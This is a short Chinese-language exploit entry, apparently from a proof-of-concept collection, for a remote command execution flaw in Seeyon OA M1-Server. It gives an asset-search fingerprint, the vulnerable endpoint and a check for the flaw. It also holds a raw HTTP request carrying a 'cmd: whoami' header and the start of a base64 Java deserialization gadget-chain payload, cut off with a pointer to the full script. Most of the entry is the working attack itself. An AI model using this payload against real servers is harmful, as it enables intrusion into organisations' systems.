# 致远OAM1-server远程命令执行漏洞

- **系统**：致远OA　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`"M1-Server 已启动"`
- **请求**：`http://xx.xx.xx.xx/esn_mobile_pns/service/userTokenService`

**请求体 / payload**
```
1. 访问poc，当状态码为500时，表示存在漏洞
2. 执行`whoami`命令并获取回显,建议使用`yakit`进行利用，经测试`burp`会导致漏洞利用失败。
POST /esn_mobile_pns/service/userTokenService HTTP/1.1
Host: xx.xx.xx.xx
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=6BC92C1D617C5B40176041B231720C3B
Sec-Fetch-User: ?1
cmd: whoami
{{base64dec(rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM…（脚本共 17308 字，完整版见原文）
```

**其他**
- 致远OA M1-server远程命令执行漏洞: * 一、漏洞简介
* 二、漏洞影响
* 三、资产测绘
* 四、漏洞复现
***
- 漏洞影响: * 致远OA M1-server